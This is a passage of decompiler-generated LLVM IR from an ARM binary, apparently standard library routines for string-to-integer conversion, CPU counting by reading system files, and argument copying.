  store i32 %v1_11354, i32* %r6.global-to-local, align 4
  br i1 %v7_1135c, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_11354
  %v3_1136c = mul i32 %v1_11360, 2
  store i32 %v3_1136c, i32* %r5.global-to-local, align 4
  %v2_11370 = add i32 %v0_11354, 2
  store i32 %v2_11370, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_11354, %bb53, %bb54
  %v0_11374 = phi i32 [ %v1_11348, %bb53 ], [ %v3_1136c, %bb54 ], [ %v1_11360, %dec_label_pc_11354 ]
  %v5_11378 = icmp slt i32 %v0_11374, 16
  br i1 %v5_11378, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_11390 = phi i32 [ %v0_112e4, %bb52 ], [ %v0_11374, %.thread8 ], [ 16, %bb55 ]
  %v1_1137c = add i32 %v0_11390, -2
  %tmp = icmp ugt i32 %v1_1137c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_1138c

.thread:                                          ; preds = %bb56
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_11438

dec_label_pc_1138c:                               ; preds = %bb56
  %v2_11394 = call i32 @function_ca5c(i32 -1, i32 %v0_11390)
  store i32 -1, i32* @r0, align 4
  %v0_113a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_113a0, i32* @r1, align 4
  %v1_113a4 = urem i32 %v0_11390, 256
  store i32 %v1_113a4, i32* %sl.global-to-local, align 4
  %v0_113a8 = call i32 @function_c960()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_113a8, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v0_113c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_113c0

dec_label_pc_113bc:                               ; preds = %bb63, %dec_label_pc_1141c
  %v0_113bc = phi i32 [ %v1_113fc36, %bb63 ], [ %v0_113bc.pre, %dec_label_pc_1141c ]
  store i32 %v0_113bc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %dec_label_pc_1138c, %dec_label_pc_113bc
  %v0_113fc = phi i32 [ %v0_113c0.pre, %dec_label_pc_1138c ], [ %v0_113bc, %dec_label_pc_113bc ]
  %v1_113c0 = inttoptr i32 %v0_113fc to i8*
  %v2_113c0 = load i8, i8* %v1_113c0, align 1
  %v3_113c0 = zext i8 %v2_113c0 to i32
  %v1_113c4 = add nsw i32 %v3_113c0, -48
  %v1_113c8 = urem i32 %v1_113c4, 256
  %v1_113d0 = or i32 %v3_113c0, 32
  %tmp71 = icmp ult i32 %v1_113c8, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_113d8

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113c0
  %tmp72 = icmp ugt i32 %v1_113d0, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_113d8
  %v1_113dc = add nsw i32 %v1_113d0, -87
  %v5_113e4 = urem i32 %v1_113dc, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_113c0, %dec_label_pc_113d8, %bb57
  %v3_11414 = phi i32 [ %v1_113c8, %dec_label_pc_113c0 ], [ 40, %dec_label_pc_113d8 ], [ %v5_113e4, %bb57 ]
  %v1_113e8 = load i32, i32* %r5.global-to-local, align 4
  %v6_113ec = icmp slt i32 %v3_11414, %v1_113e8
  br i1 %v6_113ec, label %dec_label_pc_113f0, label %dec_label_pc_11438.loopexit

dec_label_pc_113f0:                               ; preds = %bb58
  %v0_113f0 = load i32, i32* @ip, align 4
  %v1_113f0 = load i32, i32* %r8.global-to-local, align 4
  %v9_113f0 = icmp eq i32 %v0_113f0, %v1_113f0
  br i1 %v9_113f0, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_113f0
  %v1_113fc32 = add i32 %v0_113fc, 1
  store i32 %v1_113fc32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11404

bb59:                                             ; preds = %dec_label_pc_113f0
  %v3_113f0 = icmp ult i32 %v0_113f0, %v1_113f0
  %v1_113fc = add i32 %v0_113fc, 1
  store i32 %v1_113fc, i32* %r4.global-to-local, align 4
  br i1 %v3_113f0, label %dec_label_pc_11404, label %dec_label_pc_1141c

dec_label_pc_11404:                               ; preds = %bb59, %.thread31
  %v1_113fc36 = phi i32 [ %v1_113fc32, %.thread31 ], [ %v1_113fc, %bb59 ]
  %v4_1140c2235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_11404 = load i32, i32* %sl.global-to-local, align 4
  %v3_11404 = icmp uge i32 %v3_11414, %v1_11404
  %v9_11404 = icmp eq i32 %v3_11414, %v1_11404
  %v2_11408 = xor i1 %v3_11404, true
  %v3_11408 = or i1 %v9_11404, %v2_11408
  br i1 %v3_11408, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_11404
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_11404, %bb60
  %v4_1140c = phi i32 [ %v4_1140c2235, %dec_label_pc_11404 ], [ 0, %bb60 ]
  %v2_1140c = xor i1 %v9_11404, true
  %v3_1140c = and i1 %v3_11404, %v2_1140c
  br i1 %v3_1140c, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_1140c = urem i32 %v4_1140c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_11410 = phi i32 [ %v5_1140c, %bb62 ], [ %v4_1140c, %bb61 ]
  %v2_11410 = icmp eq i32 %v0_11410, 0
  br i1 %v2_11410, label %bb63, label %dec_label_pc_1141c

bb63:                                             ; preds = %thread-pre-split
  %v4_11414 = mul i32 %v0_113f0, %v1_113e8
  %v5_11414 = add i32 %v4_11414, %v3_11414
  store i32 %v5_11414, i32* @ip, align 4
  br label %dec_label_pc_113bc

dec_label_pc_1141c:                               ; preds = %bb59, %thread-pre-split
  %v0_1141c = call i32 @function_ce08()
  %v0_11424 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11424, i32* @ip, align 4
  %v0_11428 = load i32, i32* @r7, align 4
  %v2_11428 = and i32 %v0_11428, %v0_112ec
  store i32 %v2_11428, i32* @r7, align 4
  %v2_11430 = inttoptr i32 %v0_1141c to i32*
  store i32 34, i32* %v2_11430, align 4
  %v0_113bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_113bc

dec_label_pc_11438.loopexit:                      ; preds = %bb58
  %v0_11438.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11438

dec_label_pc_11438:                               ; preds = %.thread, %dec_label_pc_11438.loopexit
  %v2_1143c = phi i32 [ %v0_11438.pre, %dec_label_pc_11438.loopexit ], [ %v0_112e0, %.thread ]
  %v2_11438 = icmp eq i32 %v2_1143c, 0
  br i1 %v2_11438, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_11438
  %v1_1143c = load i32, i32* %r6.global-to-local, align 4
  %v3_1143c = inttoptr i32 %v2_1143c to i32*
  store i32 %v1_1143c, i32* %v3_1143c, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_11438, %bb64
  %v0_11444 = load i32, i32* @r7, align 4
  %v2_11444 = icmp eq i32 %v0_11444, 0
  %. = select i1 %v2_11444, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_11450 = icmp eq i32 %v0_112ec, 0
  %v0_11474.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_11450, label %dec_label_pc_1146c, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_11474.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_1145c, label %dec_label_pc_1146c

dec_label_pc_1145c:                               ; preds = %bb68
  %v0_1145c = call i32 @function_ce08()
  %v2_11464 = inttoptr i32 %v0_1145c to i32*
  store i32 34, i32* %v2_11464, align 4
  %v0_11468 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11468, i32* @ip, align 4
  %v0_1146c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1146c

dec_label_pc_1146c:                               ; preds = %bb68, %bb65, %dec_label_pc_1145c
  %v0_11474.pre = phi i32 [ %v0_11474.pre.pre, %bb68 ], [ %v0_11468, %dec_label_pc_1145c ], [ %v0_11474.pre.pre, %bb65 ]
  %v0_1146c = phi i32 [ %v0_11444, %bb68 ], [ %v0_1146c.pre, %dec_label_pc_1145c ], [ %v0_11444, %bb65 ]
  %v2_1146c = icmp eq i32 %v0_1146c, 0
  br i1 %v2_1146c, label %dec_label_pc_1146c._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_1146c
  %v2_11470 = sub i32 0, %v0_11474.pre
  store i32 %v2_11470, i32* @ip, align 4
  br label %dec_label_pc_1146c._crit_edge

dec_label_pc_1146c._crit_edge:                    ; preds = %dec_label_pc_1146c, %bb69
  %v0_11474 = phi i32 [ %v2_11470, %bb69 ], [ %v0_11474.pre, %dec_label_pc_1146c ]
  store i32 %v3_112cc, i32* @r4, align 4
  store i32 %v12_112cc, i32* @r7, align 4
  ret i32 %v0_11474

; uselistorder directives
  uselistorder i32 %v0_11474.pre, { 1, 0 }
  uselistorder i32 %v0_11474.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_1140c, { 1, 0 }
  uselistorder i1 %v3_11404, { 1, 0 }
  uselistorder i32 %v1_11404, { 1, 0 }
  uselistorder i32 %v1_113d0, { 1, 0 }
  uselistorder i32 %v1_113c8, { 1, 0 }
  uselistorder i32 %v0_113fc, { 1, 0, 2 }
  uselistorder i32 %v0_113bc, { 1, 0 }
  uselistorder i32 %v3_1136c, { 1, 0 }
  uselistorder i32 %v1_11360, { 1, 0, 2 }
  uselistorder i32 %v0_11330, { 0, 1, 3, 2 }
  uselistorder i32 %v0_112ec, { 1, 0 }
  uselistorder i32 %v0_112e4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1146c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1146c, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_11438, { 1, 0 }
  uselistorder label %dec_label_pc_1141c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_113c0, { 1, 0 }
  uselistorder label %dec_label_pc_113bc, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11334, { 1, 0 }
  uselistorder label %dec_label_pc_11330, { 1, 0 }
  uselistorder label %dec_label_pc_112f8, { 1, 0 }
}

define i32 @function_1148c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1148c:
  %stack_var_-16 = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_11640.474 to i32), i32 70812), i32* @r5, align 4
  %v4_11498 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_11640.474 to i32), i32 70904) to i32*), align 4
  store i32 %v4_11498, i32* @r4, align 4
  %v2_114a0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_114b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_11640.474 to i32), i32 70888) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_114b8)
  %v0_114cc = load i32, i32* @r5, align 4
  %v2_114cc = add i32 %v0_114cc, 16
  %v3_114cc = inttoptr i32 %v2_114cc to i32*
  %v4_114cc = load i32, i32* %v3_114cc, align 4
  call void @__pseudo_branch(i32 %v4_114cc)
  %v4_114dc = load i32, i32* @global_var_254bc.480, align 4
  %v2_114e0 = icmp eq i32 %v4_114dc, 0
  br i1 %v2_114e0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1148c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1148c, %bb
  %v2_114ec = xor i1 %v2_114e0, true
  call void @__pseudo_cond_branch(i1 %v2_114ec, i32 %v4_114dc)
  store i32 %v2_114a0, i32* @r0, align 4
  %v0_114fc = load i32, i32* @r5, align 4
  %v2_114fc = add i32 %v0_114fc, 24
  %v3_114fc = inttoptr i32 %v2_114fc to i32*
  %v4_114fc = load i32, i32* %v3_114fc, align 4
  call void @__pseudo_branch(i32 %v4_114fc)
  %v0_11508 = call i32 @function_11e04()
  %v0_11510 = load i32, i32* @r5, align 4
  %v9_11510 = icmp eq i32 %v0_11510, 86584
  br i1 %v9_11510, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_11518 = xor i1 %v9_11510, true
  call void @__pseudo_cond_branch(i1 %v2_11518, i32 ptrtoint (i32* @global_var_d8a4.483 to i32))
  %v0_1151c = load i32, i32* @r6, align 4
  %v1_11520 = call i32 @function_12748(i32 %v0_1151c)
  %v0_11524 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11524, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_11524 = load i32, i32* @r1, align 4
  %v5_11524 = sdiv i32 %v1_11520, 4096
  %v6_11524 = and i32 %v1_11524, %v5_11524
  store i32 %v6_11524, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_1153c = phi i32 [ %v1_11520, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_1153c

; uselistorder directives
  uselistorder i32 %v1_11520, { 1, 0 }
  uselistorder i1 %v9_11510, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_11544(i32 %arg1) local_unnamed_addr {
dec_label_pc_11544:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_11544 = load i32, i32* @r4, align 4
  %v6_11544 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_11548 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_11548, label %dec_label_pc_115dc, label %dec_label_pc_11558

dec_label_pc_11558:                               ; preds = %dec_label_pc_11544
  %v2_11568 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v6_1157c = call i32 @function_1227c(i32 17, i32 0, i32 %v2_11568, i32 65536, i32 65536, i32 0)
  %v3_11580 = load i32, i32* %stack_var_-44, align 4
  %v7_11584 = icmp eq i32 %v3_11580, 1
  br i1 %v7_11584, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11558
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11558, %bb
  call void @__pseudo_cond_branch(i1 %v7_11584, i32 ptrtoint (i32* @global_var_12774.485 to i32))
  %v2_11598 = ptrtoint i32* %stack_var_-16 to i32
  %v2_115a0 = call i32 @function_126e0(i32 %v2_11598, i32 %v2_11598)
  %v2_115a4 = icmp eq i32 %v2_115a0, 0
  br i1 %v2_115a4, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_115b8 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_115b8, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_115c8 = load i32, i32* %stack_var_-24, align 4
  %v1_115cc = and i32 %v3_115c8, 65536
  %v2_115cc = icmp eq i32 %v1_115cc, 0
  br i1 %v2_115cc, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_115cc, i32 ptrtoint (i32* @global_var_12774.485 to i32))
  %v0_115dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %dec_label_pc_11544, %.thread6
  %v0_115dc = phi i32 [ %v0_115dc.pre, %.thread6 ], [ 0, %dec_label_pc_11544 ]
  store i32 %v3_11544, i32* @r4, align 4
  store i32 %v6_11544, i32* @lr, align 4
  ret i32 %v0_115dc

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_1227c, { 1, 0 }
  uselistorder label %dec_label_pc_115dc, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_115f0() local_unnamed_addr {
dec_label_pc_115f0:
  %stack_var_-36 = alloca i32, align 4
  store i32 142044, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1a350.489 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_11610 = call i32 @function_12f1c(i32 ptrtoint ([11 x i8]* @global_var_1a350.489 to i32))
  store i32 %v2_11610, i32* @r6, align 4
  %v2_11614 = icmp eq i32 %v2_11610, 0
  br i1 %v2_11614, label %dec_label_pc_11694, label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_115f0
  store i32 920, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_1a35c.492 to i32), i32* @r8, align 4
  %v2_11628 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11628, i32* @r7, align 4
  br label %bb18

dec_label_pc_11630:                               ; preds = %bb18
  %v3_11630 = load i32, i32* %stack_var_-36, align 4
  %v1_11634 = inttoptr i32 %v3_11630 to i32*
  %v2_11634 = load i32, i32* %v1_11634, align 4
  %v1_11638 = inttoptr i32 %v2_11634 to i8*
  %v2_11638 = load i8, i8* %v1_11638, align 1
  %v7_1163c = icmp eq i8 %v2_11638, 99
  br i1 %v7_1163c, label %dec_label_pc_11644, label %.backedge3

dec_label_pc_11644:                               ; preds = %dec_label_pc_11630
  %v1_11644 = add i32 %v2_11634, 1
  %v2_11644 = inttoptr i32 %v1_11644 to i8*
  %v3_11644 = load i8, i8* %v2_11644, align 1
  %v7_11648 = icmp eq i8 %v3_11644, 112
  br i1 %v7_11648, label %dec_label_pc_11650, label %.backedge3

dec_label_pc_11650:                               ; preds = %dec_label_pc_11644
  %v1_11650 = add i32 %v2_11634, 2
  %v2_11650 = inttoptr i32 %v1_11650 to i8*
  %v3_11650 = load i8, i8* %v2_11650, align 1
  %v7_11654 = icmp eq i8 %v3_11650, 117
  br i1 %v7_11654, label %dec_label_pc_1165c, label %.backedge3

dec_label_pc_1165c:                               ; preds = %dec_label_pc_11650
  %v1_1165c = add i32 %v2_11634, 3
  %v2_1165c = inttoptr i32 %v1_1165c to i8*
  %v3_1165c = load i8, i8* %v2_1165c, align 1
  %v4_1165c = zext i8 %v3_1165c to i32
  %v0_11660 = load i32, i32* @r4, align 4
  %v1_11660 = load i32, i32* @sl, align 4
  %v2_11660 = add i32 %v1_11660, %v0_11660
  %v3_11660 = inttoptr i32 %v2_11660 to i32*
  %v4_11660 = load i32, i32* %v3_11660, align 4
  %v2_11664 = mul nuw nsw i32 %v4_1165c, 2
  %v2_11668 = add i32 %v4_11660, %v2_11664
  %v3_11668 = inttoptr i32 %v2_11668 to i16*
  %v4_11668 = load i16, i16* %v3_11668, align 2
  %v1_1166c = and i16 %v4_11668, 8
  %v2_1166c = icmp eq i16 %v1_1166c, 0
  br i1 %v2_1166c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_1165c
  %v1_11670 = load i32, i32* @r5, align 4
  %v2_11670 = add i32 %v1_11670, 1
  store i32 %v2_11670, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_1165c, %dec_label_pc_11630, %dec_label_pc_11644, %dec_label_pc_11650
  %v0_11674.pre = load i32, i32* @r6, align 4
  %v0_11680.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_1161c
  %v0_11680 = phi i32 [ %v0_11680.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_1a35c.492 to i32), %dec_label_pc_1161c ]
  %v0_11674 = phi i32 [ %v0_11674.pre, %.backedge3 ], [ %v2_11610, %dec_label_pc_1161c ]
  %v4_11684 = inttoptr i32 %v0_11674 to i32*
  %v5_11684 = call i32 @function_12bc0(i32* %v4_11684, i32 %v2_11628, i32 258, i32 %v0_11680)
  %v2_11688 = icmp eq i32 %v5_11684, 0
  br i1 %v2_11688, label %dec_label_pc_116f8, label %dec_label_pc_11630

dec_label_pc_11694:                               ; preds = %dec_label_pc_115f0
  store i32 ptrtoint ([14 x i8]* @global_var_1a360.495 to i32), i32* @r0, align 4
  %v2_1169c = call i32 @function_12f1c(i32 ptrtoint ([14 x i8]* @global_var_1a360.495 to i32))
  store i32 %v2_1169c, i32* @r6, align 4
  %v2_116a0 = icmp eq i32 %v2_1169c, 0
  br i1 %v2_116a0, label %bb19, label %dec_label_pc_116ac

bb19:                                             ; preds = %dec_label_pc_11694
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_116f8

dec_label_pc_116ac:                               ; preds = %dec_label_pc_11694
  store i32 ptrtoint ([10 x i8]* @global_var_1a370.497 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1a394.499 to i32), i32* @r7, align 4
  %v2_116bc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_116bc, i32* @r4, align 4
  br label %bb21

dec_label_pc_116c4:                               ; preds = %bb21
  %v0_116f0 = load i32, i32* @r8, align 4
  %v1_116f0 = inttoptr i32 %v0_116f0 to i8*
  %v3_116c4 = load i32, i32* %stack_var_-36, align 4
  %v1_116c8 = inttoptr i32 %v3_116c4 to i32*
  %v2_116c8 = load i32, i32* %v1_116c8, align 4
  store i32 %v2_116c8, i32* @r1, align 4
  %v4_116cc = call i32 @function_14410(i8* %v1_116f0, i32 %v2_116c8)
  %v2_116d0 = icmp eq i32 %v4_116cc, 0
  br i1 %v2_116d0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_116c4
  %v1_116d4 = load i32, i32* @r5, align 4
  %v2_116d4 = add i32 %v1_116d4, 1
  store i32 %v2_116d4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_116c4
  %v0_116e0.pre = load i32, i32* @r7, align 4
  %v0_116e4.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_116ac
  %v0_116e4 = phi i32 [ %v0_116e4.pre, %.backedge ], [ %v2_1169c, %dec_label_pc_116ac ]
  %v0_116e0 = phi i32 [ %v0_116e0.pre, %.backedge ], [ ptrtoint (i32* @global_var_1a394.499 to i32), %dec_label_pc_116ac ]
  %v4_116e8 = inttoptr i32 %v0_116e4 to i32*
  %v5_116e8 = call i32 @function_12bc0(i32* %v4_116e8, i32 %v2_116bc, i32 459266, i32 %v0_116e0)
  %v2_116ec = icmp eq i32 %v5_116e8, 0
  br i1 %v2_116ec, label %dec_label_pc_116f8, label %dec_label_pc_116c4

dec_label_pc_116f8:                               ; preds = %bb18, %bb21, %bb19
  %v0_116f8 = load i32, i32* @r6, align 4
  %v1_116fc = inttoptr i32 %v0_116f8 to i32*
  %v2_116fc = call i32 @function_12ee8(i32* %v1_116fc)
  %v0_11700 = load i32, i32* @r5, align 4
  %v2_11700 = icmp eq i32 %v0_11700, 0
  %.v0_11700 = select i1 %v2_11700, i32 1, i32 %v0_11700
  ret i32 %.v0_11700

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_116f8, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_1173c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1173c:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_11b24

bb:                                               ; preds = %dec_label_pc_1173c
  %v7_11750 = mul i32 %arg1, 4
  %v8_11750 = add i32 %v7_11750, ptrtoint (i32* @global_var_11758.502 to i32)
  call void @__pseudo_branch(i32 %v8_11750)
  br label %dec_label_pc_11b24

dec_label_pc_11b24:                               ; preds = %bb, %dec_label_pc_1173c
  %v0_11b24 = call i32 @function_ce08()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_11b30 = inttoptr i32 %v0_11b24 to i32*
  store i32 22, i32* %v2_11b30, align 4
  %v0_11ce0 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_11ce0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_11d14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11d14:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_11d14 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_11d14, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_11d28 = ptrtoint i32* %stack_var_-40 to i32
  %v2_11d2c = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d3c, %dec_label_pc_11d14
  %v0_11d50 = phi i32 [ 0, %dec_label_pc_11d14 ], [ %v1_11d50, %dec_label_pc_11d3c ]
  %stack_var_-36.0 = phi i32 [ %v2_11d2c, %dec_label_pc_11d14 ], [ %v1_11d44, %dec_label_pc_11d3c ]
  %v1_11d40 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_11d40 = load i32, i32* %v1_11d40, align 4
  %v1_11d44 = add i32 %stack_var_-36.0, 4
  %v2_11d48 = icmp eq i32 %v2_11d40, 0
  %v1_11d50 = add i32 %v0_11d50, 1
  store i32 %v1_11d50, i32* @lr, align 4
  br i1 %v2_11d48, label %dec_label_pc_11d58, label %dec_label_pc_11d3c

dec_label_pc_11d58:                               ; preds = %dec_label_pc_11d3c
  %v3_11d58 = mul i32 %v1_11d50, 4
  %v1_11d5c = add i32 %v3_11d58, 18
  %v1_11d60 = and i32 %v1_11d5c, -8
  %v2_11d64 = sub i32 %v2_11d28, %v1_11d60
  %v2_11d6c = inttoptr i32 %v2_11d64 to i32*
  store i32 %arg1, i32* %v2_11d6c, align 4
  %v0_11d78 = load i32, i32* @sp, align 4
  store i32 %v0_11d78, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %dec_label_pc_11d80, %dec_label_pc_11d58
  %v1_11d94 = phi i32 [ %v0_11d78, %dec_label_pc_11d58 ], [ %v5_11d94, %dec_label_pc_11d80 ]
  %stack_var_-36.1 = phi i32 [ %v2_11d2c, %dec_label_pc_11d58 ], [ %v1_11d8c, %dec_label_pc_11d80 ]
  %v1_11d84 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_11d84 = load i32, i32* %v1_11d84, align 4
  %v0_11d88 = load i32, i32* @lr, align 4
  %v1_11d88 = add i32 %v0_11d88, -1
  store i32 %v1_11d88, i32* @lr, align 4
  %v7_11d88 = icmp eq i32 %v0_11d88, 1
  %v1_11d8c = add i32 %stack_var_-36.1, 4
  %v2_11d94 = add i32 %v1_11d94, 4
  %v3_11d94 = inttoptr i32 %v2_11d94 to i32*
  store i32 %v2_11d84, i32* %v3_11d94, align 4
  %v4_11d94 = load i32, i32* %ip.global-to-local, align 4
  %v5_11d94 = add i32 %v4_11d94, 4
  store i32 %v5_11d94, i32* %ip.global-to-local, align 4
  br i1 %v7_11d88, label %dec_label_pc_11d9c, label %dec_label_pc_11d80

dec_label_pc_11d9c:                               ; preds = %dec_label_pc_11d80
  %v0_11da8 = call i32 @function_123c8()
  ret i32 %v0_11da8

; uselistorder directives
  uselistorder i32 %v5_11d94, { 1, 0 }
  uselistorder i32 %v0_11d88, { 1, 0 }
  uselistorder i32 %v1_11d50, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_11dbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_11dbc:
  %v0_11dbc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11dbc, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11dbc
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11dbc, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_11dc8() local_unnamed_addr {
dec_label_pc_11dc8:
  ret i32 0
}

define i32 @function_11dd0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11dd0:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_11dd0 = add i32 %tmp, 4
  %v4_11dd0 = inttoptr i32 %v3_11dd0 to i32*
  store i32 %arg3, i32* %v4_11dd0, align 4
  ret i32 %tmp
}

